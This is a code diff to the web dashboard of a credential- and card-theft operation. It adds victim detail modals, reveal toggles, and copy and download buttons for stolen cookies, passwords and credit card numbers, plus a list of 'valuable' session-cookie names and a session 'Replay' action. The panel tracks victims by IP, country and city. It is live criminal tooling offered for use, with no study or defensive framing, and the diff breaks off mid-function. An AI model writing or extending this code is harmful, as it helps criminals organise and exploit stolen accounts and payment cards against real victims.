@@ -422,6 +422,25 @@
         .btn.danger:hover { background: rgba(255,68,68,0.08); box-shadow: 0 0 20px rgba(255,68,68,0.1); }
         .btn.warning { border-color: #f59e0b; color: #f59e0b; }
         .btn.warning:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }
+        .btn-icon-sm {
+            background: transparent;
+            border: 1px solid #1a2538;
+            color: #64748b;
+            padding: 0 6px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 10px;
+            transition: 0.2s;
+            line-height: 20px;
+            height: 22px;
+        }
+        .btn-icon-sm:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
+        .btn-icon-sm.copy { border-color: #00ff88; color: #00ff88; }
+        .btn-icon-sm.copy:hover { background: rgba(0,255,136,0.08); }
+        .btn-icon-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .btn-icon-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .btn-icon-sm.eye { border-color: #3b82f6; color: #3b82f6; }
+        .btn-icon-sm.eye:hover { background: rgba(59,130,246,0.08); }
 
         .domain-grid {
             display: grid;
@@ -510,6 +529,7 @@
             color: #94a3b8;
             border: 1px solid #1e293b;
             transition: 0.2s;
+            cursor: pointer;
         }
         .domain-card .victims-list .victim-tag:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1e2a3e; }
         .domain-card .victims-list .victim-tag .flag { font-size: 10px; }
@@ -610,8 +630,9 @@
             border-radius: 8px;
             padding: 12px 14px;
             transition: 0.2s;
+            cursor: pointer;
         }
-        .victim-card:hover { border-color: #2a3a5a; }
+        .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
         .victim-card .v-header { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; }
         .victim-card .v-header .flag { font-size: 18px; }
         .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
@@ -635,7 +656,7 @@
 
         .modal {
             background: linear-gradient(145deg, #111827, #0f1626);
-            max-width: 820px;
+            max-width: 900px;
             margin: 0 auto;
             border-radius: 14px;
             padding: 20px 22px;
@@ -712,36 +733,65 @@
         }
         .modal .victim-entry .delete-btn:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
 
-        .modal .victim-entry .cookies-section {
+        .modal .victim-entry .data-section {
             margin-top: 4px;
             padding-top: 4px;
             border-top: 1px solid #1a2538;
         }
-        .modal .victim-entry .cookies-section .cookie-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 2px 0;
-            font-family: 'Cascadia Code', 'Consolas', monospace;
+        .modal .victim-entry .data-section .section-title {
             font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #475569;
+            margin-bottom: 3px;
+        }
+        .modal .victim-entry .data-section .data-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 3px 0;
             border-bottom: 1px solid #0f1626;
-            gap: 4px;
+            font-size: 10px;
+            flex-wrap: wrap;
         }
-        .modal .victim-entry .cookies-section .cookie-item .name { color: #00ff88; word-break: break-word; }
-        .modal .victim-entry .cookies-section .cookie-item .value { color: #f59e0b; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
-        .modal .victim-entry .cookies-section .cookie-item .actions { display: flex; gap: 3px; flex-shrink: 0; }
-        .modal .victim-entry .cookies-section .cookie-item .actions .btn-icon {
-            background: transparent;
-            border: 1px solid #1a2538;
+        .modal .victim-entry .data-section .data-item .label {
+            color: #94a3b8;
+            min-width: 60px;
+            font-size: 9px;
+        }
+        .modal .victim-entry .data-section .data-item .value {
+            color: #f1f5f9;
+            font-family: monospace;
+            word-break: break-all;
+            flex: 1;
+            min-width: 80px;
+        }
+        .modal .victim-entry .data-section .data-item .value.password-hidden {
+            filter: blur(4px);
+            transition: filter 0.3s;
+        }
+        .modal .victim-entry .data-section .data-item .value.password-hidden:hover { filter: blur(0); }
+        .modal .victim-entry .data-section .data-item .link {
+            color: #00ff88;
+            text-decoration: none;
+            font-size: 9px;
+            word-break: break-all;
+        }
+        .modal .victim-entry .data-section .data-item .link:hover { text-decoration: underline; color: #66ffaa; }
+        .modal .victim-entry .data-section .data-item .actions {
+            display: flex;
+            gap: 3px;
+            flex-shrink: 0;
+        }
+        .modal .victim-entry .data-section .data-item .badge-type {
+            font-size: 6px;
+            background: #1a2538;
+            padding: 1px 6px;
+            border-radius: 4px;
             color: #64748b;
-            padding: 0 5px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 8px;
-            transition: 0.2s;
+            text-transform: uppercase;
         }
-        .modal .victim-entry .cookies-section .cookie-item .actions .btn-icon:hover { border-color: #2a3a5a; color: #e2e8f0; }
-        .modal .victim-entry .cookies-section .cookie-item .valuable-tag {
+        .modal .victim-entry .data-section .data-item .badge-valuable {
             font-size: 5px;
             background: linear-gradient(135deg, #ff4444, #cc3333);
             color: #fff;
@@ -749,7 +799,6 @@
             border-radius: 6px;
             text-transform: uppercase;
             font-weight: 700;
-            flex-shrink: 0;
         }
 
         .modal .session-actions {
@@ -919,6 +968,20 @@
         .powered-footer { text-align: center; font-size: 10px; color: #1e293b; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
         .powered-footer .name { color: #00ff88; font-weight: 600; }
 
+        .data-item-link {
+            color: #00ff88;
+            text-decoration: none;
+            font-size: 9px;
+            word-break: break-all;
+            cursor: pointer;
+            border: 1px solid #1a2538;
+            padding: 0 6px;
+            border-radius: 4px;
+            background: #0f1626;
+        }
+        .data-item-link:hover { background: #1a2538; border-color: #00ff88; }
+
+        /* RESPONSIVE — FULLY ADAPTIVE */
         @media (max-width: 992px) { .domain-grid { grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); } }
         @media (max-width: 768px) {
             .sidebar { position: fixed; top: 0; left: 0; transform: translateX(-260px); width: 260px; height: 100vh; z-index: 150; border-right: 1px solid #1a2538; box-shadow: 4px 0 40px rgba(0,0,0,0.5); }
@@ -936,6 +999,9 @@
             .logout-confirm-box { padding: 20px 16px; }
             .custom-confirm-box { padding: 20px 16px; }
             .victims-grid { grid-template-columns: 1fr; }
+            .modal .victim-entry .data-section .data-item { flex-wrap: wrap; }
+            .modal .victim-entry .data-section .data-item .label { min-width: 40px; }
+            .modal .victim-entry .data-section .data-item .actions { margin-top: 2px; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -951,14 +1017,16 @@
             .domain-card .victims-list .victim-tag { font-size: 7px; }
             .modal .victim-entry .victim-header .ip { font-size: 11px; }
             .modal .victim-entry .victim-header .flag { font-size: 16px; }
-            .modal .victim-entry .cookies-section .cookie-item { font-size: 8px; flex-wrap: wrap; }
-            .modal .victim-entry .cookies-section .cookie-item .value { max-width: 80px; }
+            .modal .victim-entry .data-section .data-item { font-size: 9px; }
+            .modal .victim-entry .data-section .data-item .value { min-width: 60px; }
             .cookies-table { font-size: 9px; min-width: 400px; }
             .cookies-table td, .cookies-table th { padding: 4px 6px; }
             .settings-modal { padding: 12px; }
             .stats-row .stat-card .number { font-size: 20px; }
             .btn { font-size: 10px; padding: 4px 8px; }
             .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
+            .modal .session-actions .btn { font-size: 10px; padding: 4px 10px; }
+            .btn-icon-sm { font-size: 8px; padding: 0 4px; height: 18px; line-height: 18px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -966,7 +1034,8 @@
             .domain-card .header .domain { font-size: 12px; }
             .domain-card .victims-list .victim-tag .ip { font-size: 7px; }
             .topbar .page-title h2 { font-size: 15px; }
-            .modal .victim-entry .cookies-section .cookie-item .value { max-width: 60px; }
+            .modal .victim-entry .data-section .data-item .value { min-width: 40px; font-size: 8px; }
+            .modal .victim-entry .data-section .data-item .label { font-size: 8px; min-width: 30px; }
         }
     </style>
 </head>
@@ -1125,10 +1194,10 @@
             </div>
         </div>
 
-        <!-- VIEW: VICTIMS -->
+        <!-- VIEW: VICTIMS — clickable to open modal -->
         <div class="view-content" id="viewVictims">
             <div class="toolbar" style="margin-bottom:12px;">
-                <div class="left"><span style="color:#64748b;font-size:12px;">All victims</span></div>
+                <div class="left"><span style="color:#64748b;font-size:12px;">All victims — click to view details</span></div>
                 <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
             </div>
             <div class="victims-grid" id="victimsGrid">
@@ -1136,7 +1205,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CREDENTIALS — FIXED -->
+        <!-- VIEW: CREDENTIALS -->
         <div class="view-content" id="viewCreds">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials</span></div>
@@ -1147,7 +1216,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CARDS — FIXED -->
+        <!-- VIEW: CARDS -->
         <div class="view-content" id="viewCards">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards</span></div>
@@ -1257,11 +1326,11 @@
         </div>
     </div>
 
-    <!-- MODALS -->
+    <!-- MODAL -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal">
             <button class="close" onclick="closeModal()">✕</button>
-            <h2 id="modalTitle">Domain</h2>
+            <h2 id="modalTitle">Victim Details</h2>
             <div id="modalContent"></div>
             <div class="session-actions">
                 <button class="btn primary" onclick="replayFromModal()">▶️ Replay</button>
@@ -1347,7 +1416,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — COMPLETE FIXED VERSION
+    DASHBOARD LOGIC — ALL FEATURES
     ============================================================ -->
     <script>
         // ============================================================
@@ -1374,11 +1443,12 @@
 
         let allData = [];
         let trashData = [];
+        let currentModalEntry = null;
         let currentModalDomain = null;
-        let currentModalStats = null;
         let currentView = 'main';
         let isTestingAll = false;
         let confirmCallback = null;
+        let passwordVisibility = {};
 
         const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];
 
@@ -1484,7 +1554,7 @@
         }
 
         // ============================================================
-        // VIEW SWITCHING — FIXED: renders after data is ready
+        // VIEW SWITCHING
         // ============================================================
 
         function switchView(view) {
@@ -1495,7 +1565,7 @@
             const viewMap = {
                 'main': { viewId: 'viewMain', navId: 'navMain', title: 'Dashboard', sub: 'Monitor stolen cookies & sessions · ' },
                 'cookies': { viewId: 'viewCookies', navId: 'navCookies', title: '🍪 All Cookies', sub: 'View all stolen cookies' },
-                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'All victims' },
+                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'All victims — click to view details' },
                 'creds': { viewId: 'viewCreds', navId: 'navCreds', title: '🔐 Credentials', sub: 'All stolen credentials' },
                 'cards': { viewId: 'viewCards', navId: 'navCards', title: '💳 Cards', sub: 'All stolen credit cards' },
                 'trash': { viewId: 'viewTrash', navId: 'navTrash', title: '🗑️ Trash', sub: 'Deleted victims' },
@@ -1514,7 +1584,6 @@
 
             closeSidebar();
 
-            // ---- Render after switching, with data check ----
             if (view === 'cookies') renderCookiesView();
             else if (view === 'victims') renderVictimsView();
             else if (view === 'creds') renderCredsView();
@@ -1536,7 +1605,6 @@
                 render(allData);
                 updateSidebarCounts(allData);
 
-                // If currently on creds/cards view, re-render after data loads
                 if (currentView === 'creds') renderCredsView();
                 if (currentView === 'cards') renderCardsView();
                 if (currentView === 'cookies') renderCookiesView();
@@ -1585,7 +1653,7 @@
         }
 
         // ============================================================
-        // RENDER FUNCTIONS
+        // RENDER DASHBOARD
         // ============================================================
 
         function render(data) {
@@ -1661,7 +1729,7 @@
                     const flag = getFlagEmoji(entry.countryCode);
                     const time = timeAgo(entry.receivedAt);
                     victimsHtml += `
-                        <span class="victim-tag" title="${entry.ip} · ${entry.country} · ${formatFullTime(entry.receivedAt)}">
+                        <span class="victim-tag" onclick="event.stopPropagation(); openModalForEntry('${entry._uniqueId}')" title="${entry.ip} · ${entry.country} · ${formatFullTime(entry.receivedAt)}">
                             <span class="flag">${flag}</span>
                             <span class="ip">${entry.ip}</span>
                             <span class="time"><span class="ago">${time}</span></span>
@@ -1669,7 +1737,7 @@
                     `;
                 });
                 if (stats.entries.length > 5) {
-                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;">+${stats.entries.length - 5}</span>`;
+                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;cursor:default;">+${stats.entries.length - 5}</span>`;
                 }
 
                 let badges = '';
@@ -1747,7 +1815,7 @@
                     const flag = getFlagEmoji(entry.countryCode);
                     const deleted = entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown';
                     victimsHtml += `
-                        <span class="victim-tag" title="${entry.ip} · ${entry.country} · Deleted: ${formatFullTime(entry.deletedAt)}">
+                        <span class="victim-tag" onclick="event.stopPropagation(); openModalForEntry('${entry._uniqueId}')" title="${entry.ip} · ${entry.country} · Deleted: ${formatFullTime(entry.deletedAt)}">
                             <span class="flag">${flag}</span>
                             <span class="ip">${entry.ip}</span>
                             <span class="time"><span style="color:#f59e0b;">🗑️ ${deleted}</span></span>
@@ -1755,7 +1823,7 @@
                     `;
                 });
                 if (stats.entries.length > 5) {
-                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;">+${stats.entries.length - 5}</span>`;
+                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;cursor:default;">+${stats.entries.length - 5}</span>`;
                 }
 
                 card.innerHTML = `
@@ -1782,7 +1850,7 @@
         }
 
         // ============================================================
-        // CREDENTIALS VIEW — FIXED: handles both old and new formats
+        // CREDENTIALS VIEW — with link, copy, eye
         // ============================================================
 
         function renderCredsView() {
@@ -1793,22 +1861,21 @@
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 const creds = entry.credentials || [];
                 creds.forEach(c => {
-                    // ---- Normalize: handle both {name,value,type} and {url,username,password} ----
                     const name = c.name || c.username || c.field || 'unknown';
                     const value = c.value || c.password || '';
                     const type = c.type || 'text';
-
-                    // Skip empty credentials
+                    const url = c.url || c.origin_url || domain;
                     if (!value || value === '' || value === 'undefined' || value === 'null') return;
-
                     allCreds.push({
                         domain: domain,
                         name: name,
                         value: value,
                         type: type,
+                        url: url,
                         ip: entry.ip,
                         time: entry.receivedAt,
-                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown'
+                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown',
+                        entryId: entry._uniqueId
                     });
                 });
             });
@@ -1824,32 +1891,43 @@
                     <thead>
                         <tr>
                             <th>Domain</th>
-                            <th>Username / Email</th>
+                            <th>Username</th>
                             <th>Password</th>
                             <th>Type</th>
+                            <th>Link</th>
                             <th>IP</th>
                             <th>Time</th>
+                            <th style="text-align:center;">Actions</th>
                         </tr>
                     </thead>
                     <tbody>
             `;
 
-            allCreds.slice(0, 200).forEach(cred => {
+            allCreds.slice(0, 200).forEach((cred, idx) => {
+                const uid = 'cred-' + idx;
                 const escapedValue = cred.value.replace(/'/g, "\\'");
+                const visKey = 'cred-vis-' + idx;
+                const isVisible = passwordVisibility[visKey] || false;
                 html += `
                     <tr class="cred-row">
-                        <td class="cookie-domain">${cred.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${cred.domain}</td>
                         <td class="cred-name">${cred.name}</td>
-                        <td class="cred-value" title="${cred.value}">${cred.value.length > 40 ? cred.value.slice(0,40)+'...' : cred.value}</td>
+                        <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
                         <td><span class="cred-type">${cred.type}</span></td>
+                        <td><a href="https://${cred.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${cred.url.length > 25 ? cred.url.slice(0,25)+'...' : cred.url}</a></td>
                         <td style="color:#64748b;font-size:10px;">${cred.ip}</td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'cred-val-${idx}')">👁️</button>
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${cred.name}', '${escapedValue}', 'credential')">⬇️</button>
+                        </td>
                     </tr>
                 `;
             });
 
             if (allCreds.length > 200) {
-                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
+                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
             }
 
             html += `</tbody></table>`;
@@ -1857,7 +1935,7 @@
         }
 
         // ============================================================
-        // CARDS VIEW — FIXED: handles both old and new formats
+        // CARDS VIEW — with link, copy, eye for card number
         // ============================================================
 
         function renderCardsView() {
@@ -1868,29 +1946,24 @@
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 const cards = entry.cards || [];
                 cards.forEach(c => {
-                    // ---- Normalize: handle different formats ----
-                    const name = c.name || c.cardholder || c.holder || 'Unknown';
                     let value = c.value || c.number || c.card_number || '';
+                    const name = c.name || c.cardholder || c.holder || 'Unknown';
                     const type = c.type || 'card-number';
-                    const month = c.month || c.exp_month || c.expiryMonth || '';
-                    const year = c.year || c.exp_year || c.expiryYear || '';
-
-                    // If we have separate month/year, format as MM/YY
-                    if (month && year && !value.includes('/')) {
-                        value = month + '/' + year;
-                    }
-
-                    // Skip empty cards
+                    const url = c.url || c.origin_url || domain;
                     if (!value || value === '' || value === 'undefined' || value === 'null') return;
-
+                    if (c.month && c.year && !value.includes('/')) {
+                        value = c.month + '/' + c.year;
+                    }
                     allCards.push({
                         domain: domain,
                         name: name,
                         value: value,
                         type: type,
+                        url: url,
                         ip: entry.ip,
                         time: entry.receivedAt,
-                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown'
+                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown',
+                        entryId: entry._uniqueId
                     });
                 });
             });
@@ -1907,31 +1980,43 @@
                         <tr>
                             <th>Domain</th>
                             <th>Cardholder</th>
-                            <th>Card Number / Expiry</th>
+                            <th>Number / Expiry</th>
                             <th>Type</th>
+                            <th>Link</th>
                             <th>IP</th>
                             <th>Time</th>
+                            <th style="text-align:center;">Actions</th>
                         </tr>
                     </thead>
                     <tbody>
             `;
 
-            allCards.slice(0, 200).forEach(card => {
+            allCards.slice(0, 200).forEach((card, idx) => {
+                const uid = 'card-' + idx;
                 const escapedValue = card.value.replace(/'/g, "\\'");
+                const visKey = 'card-vis-' + idx;
+                const isVisible = passwordVisibility[visKey] || false;
+                const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
                 html += `
                     <tr class="card-row">
-                        <td class="cookie-domain">${card.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${card.domain}</td>
                         <td class="card-name">${card.name}</td>
-                        <td class="card-value" title="${card.value}">${card.value.length > 40 ? card.value.slice(0,40)+'...' : card.value}</td>
+                        <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
                         <td><span class="card-type">${card.type}</span></td>
+                        <td><a href="https://${card.url}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${card.url.length > 25 ? card.url.slice(0,25)+'...' : card.url}</a></td>
                         <td style="color:#64748b;font-size:10px;">${card.ip}</td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'card-val-${idx}')">👁️</button>
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${card.name}', '${escapedValue}', 'card')">⬇️</button>
+                        </td>
                     </tr>
                 `;
             });
 
             if (allCards.length > 200) {
-                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
+                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
             }
 
             html += `</tbody></table>`;
@@ -1954,7 +2039,8 @@
                         domain: domain,
                         name: name,
                         value: value,
-                        valuable: isValuable(name)
+                        valuable: isValuable(name),
+                        entryId: entry._uniqueId
                     });
                 });
             });
@@ -1979,16 +2065,17 @@
                     <tbody>
             `;
 
-            allCookies.slice(0, 150).forEach(cookie => {
+            allCookies.slice(0, 150).forEach((cookie, idx) => {
                 const escapedValue = cookie.value.replace(/'/g, "\\'");
                 html += `
                     <tr>
-                        <td class="cookie-domain">${cookie.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${cookie.entryId}')" style="cursor:pointer;">${cookie.domain}</td>
                         <td class="cookie-name">${cookie.name}</td>
                         <td class="cookie-value" title="${cookie.value}">${cookie.value.length > 40 ? cookie.value.slice(0,40)+'...' : cookie.value}</td>
                         <td style="text-align:center;">${cookie.valuable ? '<span class="cookie-valuable">Valuable</span>' : '<span style="color:#475569;font-size:8px;">—</span>'}</td>
-                        <td style="text-align:center;">
-                            <button class="btn-icon" onclick="copyCookie('${escapedValue}')" style="background:transparent;border:1px solid #1a2538;color:#64748b;padding:0 4px;border-radius:3px;cursor:pointer;font-size:8px;">📋</button>
+                        <td style="text-align:center;white-space:nowrap;">
+                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
+                            <button class="btn-icon-sm download" onclick="downloadItem('${cookie.name}', '${escapedValue}', 'cookie')">⬇️</button>
                         </td>
                     </tr>
                 `;
@@ -2003,7 +2090,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW
+        // VICTIMS VIEW — clickable cards
         // ============================================================
 
         function renderVictimsView() {
@@ -2038,7 +2125,7 @@
                 else if (ua.includes('PowerShell')) browser = 'PowerShell';
 
                 html += `
-                    <div class="victim-card">
+                    <div class="victim-card" onclick="openModalForEntry('${entry._uniqueId}')">
                         <div class="v-header">
                             <span class="flag">${flag}</span>
                             <span class="ip">${entry.ip || 'Unknown'}</span>
@@ -2058,7 +2145,233 @@
         }
 
         // ============================================================
-        // SESSION REPLAY VIEW
+        // MODAL — DETAILED VIEW with links, copy, eye, download
+        // ============================================================
+
+        function openModalForEntry(uniqueId) {
+            let entry = null;
+            let source = 'main';
+            for (const e of allData) {
+                if (e._uniqueId === uniqueId) { entry = e; source = 'main'; break; }
+            }
+            if (!entry) {
+                for (const e of trashData) {
+                    if (e._uniqueId === uniqueId) { entry = e; source = 'trash'; break; }
+                }
+            }
+            if (!entry) { showToast('❌ Victim not found', 'error'); return; }
+
+            currentModalEntry = entry;
+            currentModalDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+
+            const overlay = document.getElementById('modalOverlay');
+            const title = source === 'trash' ? `🗑️ ${currentModalDomain} — Deleted` :
+                          `👤 ${currentModalDomain} — Victim Details`;
+
+            document.getElementById('modalTitle').textContent = title;
+
+            const flag = getFlagEmoji(entry.countryCode);
+            const fullTime = formatFullTime(entry.receivedAt);
+            const ago = timeAgo(entry.receivedAt);
+            const isTrash = source === 'trash';
+
+            const ua = entry.fingerprint?.userAgent || '';
+            let browser = 'Unknown';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Opera')) browser = 'Opera';
+            else if (ua.includes('Brave')) browser = 'Brave';
+            else if (ua.includes('PowerShell')) browser = 'PowerShell';
+
+            const cookies = entry.cookies || {};
+            const cookieEntries = Object.entries(cookies);
+            const creds = entry.credentials || [];
+            const cards = entry.cards || [];
+
+            let html = `
+                <div class="victim-entry">
+                    <div class="victim-header">
+                        <span class="flag">${flag}</span>
+                        <span class="ip">${entry.ip}</span>
+                        <span class="country">${entry.country}</span>
+                        <span class="city">📍 ${entry.city}</span>
+                        <span style="font-size:10px;color:#94a3b8;margin-left:4px;">🌐 ${browser}</span>
+                        <span class="time-badge">
+                            <span class="clock-icon">${isTrash ? '🗑️' : '🕐'}</span>
+                            <span class="full-time">${isTrash ? (entry.deletedAt ? formatFullTime(entry.deletedAt) : 'Unknown') : fullTime}</span>
+                            <span class="ago">(${isTrash ? (entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown') : ago})</span>
+                        </span>
+                    </div>
+
+                    <!-- COOKIES -->
+                    <div class="data-section">
+                        <div class="section-title">🍪 Cookies (${cookieEntries.length})</div>
+                        ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cookies</div>' : ''}
+                        ${cookieEntries.map(([name, value]) => {
+                            const valuable = isValuable(name);
+                            const escaped = value.replace(/'/g, "\\'");
+                            return `
+                                <div class="data-item">
+                                    <span class="label">${name}</span>
+                                    <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
+                                    ${valuable ? '<span class="badge-valuable">Valuable</span>' : ''}
+                                    <div class="actions">
+                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'cookie')">⬇️</button>
+                                    </div>
+                                </div>
+                            `;
+                        }).join('')}
+                    </div>
+
+                    <!-- CREDENTIALS -->
+                    <div class="data-section">
+                        <div class="section-title">🔐 Credentials (${creds.length})</div>
+                        ${creds.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No credentials</div>' : ''}
+                        ${creds.map((c, idx) => {
+                            const name = c.name || c.username || c.field || 'unknown';
+                            const value = c.value || c.password || '';
+                            const url = c.url || c.origin_url || currentModalDomain;
+                            const type = c.type || 'text';
+                            const escaped = value.replace(/'/g, "\\'");
+                            const visKey = 'modal-cred-' + idx;
+                            const isVisible = passwordVisibility[visKey] || false;
+                            if (!value || value === '' || value === 'undefined' || value === 'null') return '';
+                            return `
+                                <div class="data-item">
+                                    <span class="label" style="color:#ec4899;">${name}</span>
+                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${isVisible ? value : value.replace(/./g, '•')}</span>
+                                    <span class="badge-type">${type}</span>
+                                    <a href="https://${url}" target="_blank" class="link">🔗 ${url.length > 30 ? url.slice(0,30)+'...' : url}</a>
+                                    <div class="actions">
+                                        <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'credential')">⬇️</button>
+                                    </div>
+                                </div>
+                            `;
+                        }).filter(Boolean).join('')}
+                    </div>
+
+                    <!-- CARDS -->
+                    <div class="data-section">
+                        <div class="section-title">💳 Cards (${cards.length})</div>
+                        ${cards.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cards</div>' : ''}
+                        ${cards.map((c, idx) => {
+                            let value = c.value || c.number || c.card_number || '';
+                            const name = c.name || c.cardholder || c.holder || 'Unknown';
+                            const url = c.url || c.origin_url || currentModalDomain;
+                            const type = c.type || 'card';
+                            if (!value || value === '' || value === 'undefined' || value === 'null') return '';
+                            if (c.month && c.year && !value.includes('/')) {
+                                value = c.month + '/' + c.year;
+                            }
+                            const escaped = value.replace(/'/g, "\\'");
+                            const visKey = 'modal-card-' + idx;
+                            const isVisible = passwordVisibility[visKey] || false;
+                            const displayValue = isVisible ? value : value.replace(/[0-9]/g, '•');
+                            return `
+                                <div class="data-item">
+                                    <span class="label" style="color:#06b6d4;">${name}</span>
+                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${displayValue}</span>
+                                    <span class="badge-type">${type}</span>
+                                    <a href="https://${url}" target="_blank" class="link">🔗 ${url.length > 30 ? url.slice(0,30)+'...' : url}</a>
+                                    <div class="actions">
+                                        <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'card')">⬇️</button>
+                                    </div>
+                                </div>
+                            `;
+                        }).filter(Boolean).join('')}
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('modalContent').innerHTML = html;
+            document.getElementById('testResultModal').className = 'test-result';
+            overlay.classList.add('active');
+        }
+
+        function openModal(domain, stats, source) {
+            if (stats.entries && stats.entries.length > 0) {
+                openModalForEntry(stats.entries[0]._uniqueId);
+                return;
+            }
+            showToast('❌ No victim data', 'error');
+        }
+
+        function closeModal() {
+            document.getElementById('modalOverlay').classList.remove('active');
+        }
+
+        // ============================================================
+        // PASSWORD VISIBILITY TOGGLE
+        // ============================================================
+
+        function togglePasswordVis(key, elementId) {
+            passwordVisibility[key] = !passwordVisibility[key];
+            const el = document.getElementById(elementId);
+            if (el) {
+                if (passwordVisibility[key]) {
+                    el.classList.remove('password-hidden');
+                    el.textContent = el.dataset.originalValue || el.textContent;
+                } else {
+                    el.classList.add('password-hidden');
+                    el.textContent = el.textContent.replace(/[^\s]/g, '•');
+                }
+            }
